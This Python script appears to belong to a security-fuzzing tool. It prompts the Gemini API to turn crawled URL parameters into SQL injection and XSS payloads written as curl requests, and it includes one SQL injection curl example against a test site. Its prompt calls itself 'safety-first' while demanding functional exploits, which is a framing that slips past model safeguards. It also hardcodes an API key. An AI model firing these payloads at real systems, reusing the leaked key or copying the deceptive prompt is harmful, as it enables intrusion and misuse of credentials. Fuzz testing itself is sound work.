import os
import json
import google.generativeai as genai

# Configure API key
# NOTE: Replace this placeholder with your actual, securely loaded API key
genai.configure(api_key="AIzaSyBxfeo0C6eDYYdtI_TefMlB3h3uPjoK2-I")

def generate_payloads(param_file, payload_file, model="gemini-2.5-flash"):
    """
    Loads parameter templates, sends a prompt to the Gemini API to generate 
    safe placeholder fuzzing payloads, and returns them as a list of strings.
    """
    
    # 1. Load template JSON
    try:
        with open(param_file, "r", encoding="utf-8") as f:
            data = json.load(f)
    except FileNotFoundError:
        print(f"Error: Parameter file not found at {param_file}")
        return []
    except json.JSONDecodeError:
        print(f"Error: Invalid JSON format in {param_file}")
        return []

    try:
        with open(payload_file, "r", encoding="utf-8") as f:
            payload = json.load(f) 
    except FileNotFoundError:
        print("Error: payload_library.json file not found.")
        payload_data = {}   
    except json.JSONDecodeError:
        print("Error: Invalid JSON format in payload_library.json.")
        payload_data = {}       
    
        
    templates = data.get("templates", data)  # support {"templates":[]} or a direct list/dict

    # 2. Build the safe prompt
    prompt = (
    "You are a safety-first payload-generator assistant.\n"
    "Generate advanced *test payload * that categorize attack types, you should produce functional exploits, SQL syntax, XSS scripts, or real malicious strings.\n"
    "choose url only have parameters that can be exploited.\n"
    "Return only payload strings (one per line) with url , no explanations, no JSON, no surrounding text.\n"
    "For each requested parameter, produce a url with parameter name and payload for that specific parameter.\n"
    "i will upload smaple payloads use it and also i upload  parameters with urls details read it make  responce contain each url correct methods(GET or POST) with parameter passing payload .\n\n"
    f"Here are the parameters with url:\n{json.dumps(templates, indent=2)} using this you can analyze url methods and types of exploits function can use \n"
    f"Here are some sample payloads:\n{json.dumps(payload)}"
    "responce be like curl command that to performs request  here the example format:\n"
    """curl   -sS -i -X POST -d "uname=admin&pass=' OR '1'='1'" http://testphp.vulnweb.com/userinfo.php  \n\n"""
)
    # 3. Call Gemini
    try:
        response = genai.GenerativeModel(model).generate_content(prompt)
    except Exception as e:
        print(f"Error calling Gemini API: {e}")
        return []

    payload_list = [
        line.strip() 
        for line in response.text.split('\n') 
        if line.strip()
    ]
    
    return payload_list

if __name__ == "__main__":
    # NOTE: Ensure this file path is correct on the machine running the code
    param_file_path = r"/home/arunexploit/develop/Smartfuzzier/node-crawler/src/param_templates_with_predicted_types.json"
    payload_file_path = r"/home/arunexploit/develop/Smartfuzzier/backend/app/ml/payload_library.json"   
    output_path = r"/home/arunexploit/develop/Smartfuzzier/node-crawler/src/payloads_vulners.txt"
    print(f"Generating payloads using parameters from: {param_file_path}\n")
    print(f"Payloads using to: {payload_file_path}\n")
    
    results = generate_payloads(param_file_path,payload_file_path)
    
    open(output_path, "w").write('\n'.join(results))
    
    
    if results:
        # Print the resulting list of strings clearly
        print("--- Generated Placeholder Payloads ---")
        print(f"payloads generated :{output_path}")
        print(f"\nTotal payloads generated: {len(results)}")
    else:
        print("Payload generation failed or returned an empty list.")